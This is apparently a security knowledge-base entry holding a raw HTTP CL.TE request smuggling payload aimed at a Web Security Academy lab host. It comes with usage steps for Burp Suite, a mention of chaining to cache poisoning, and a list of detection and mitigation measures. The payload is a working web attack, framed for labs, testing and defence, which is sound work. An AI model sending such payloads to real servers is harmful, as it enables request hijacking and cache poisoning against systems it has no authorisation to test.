---
id: 06c8583a-c1ce-40bc-b97b-933ba2759c80
type: code
language: http
verified: true
created_at: '2020-08-12T03:18:39.661088+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - http-request-smuggling
  - payload
platforms:
  - Web
validated: true
---

# HTTP-Request-Smuggling-CL-TE-Payload

## Code

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
5e

POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1 
0
```

## Description

This raw HTTP request payload is designed for a CL.TE HTTP Request Smuggling attack. It uses a short Content-Length of 4 bytes followed by a chunked Transfer-Encoding body that smuggles a secondary POST request to a non-existent /404 endpoint. When sent to a vulnerable server, it exploits parsing differences between front-end proxies and back-end servers, allowing the smuggled request to be processed independently.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Host | Target hostname or lab ID | your-lab-id.web-security-academy.net |
| / | Initial endpoint path | / (root) |
| /404 | Smuggled endpoint path | /404 (non-existent for testing) |
| x=1 | Smuggled request body | x=1 (arbitrary payload) |

## Usage

Paste this payload into Burp Suite Repeater or a similar tool after intercepting a legitimate POST request. Modify the Host header to match the target. Send the request to observe if the server returns a differential response (e.g., 404 for the smuggled part). This is typically used in web vulnerability labs or penetration testing to confirm request smuggling vulnerabilities before chaining to further exploits like cache poisoning.

## Detection

- Monitor for requests with both Content-Length and Transfer-Encoding headers; reject or log them.
- Analyze access logs for mismatched request lengths or unexpected 404s following normal requests.
- Use WAF rules to detect chunked bodies containing full HTTP requests.
- Enable HTTP/2 or strict parsing to mitigate legacy HTTP/1.1 smuggling.

## Related

- [[procedures/HTTP-Request-Smuggling-CL-TE-Differential-Response]]
- [[tools/Burp-Suite]]
